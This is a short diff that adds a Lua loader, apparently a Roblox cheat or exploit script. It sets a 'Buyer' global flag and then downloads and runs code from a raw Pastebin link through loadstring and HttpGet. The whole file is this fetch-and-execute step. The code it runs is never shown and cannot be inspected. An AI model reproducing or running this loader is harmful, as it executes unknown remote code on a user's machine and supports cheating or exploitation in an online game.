@@ -1,0 +1,3 @@
+_G.Buyer = true
+
+loadstring(game:HttpGet"https://pastebin.com/raw/wXArZx7S")()
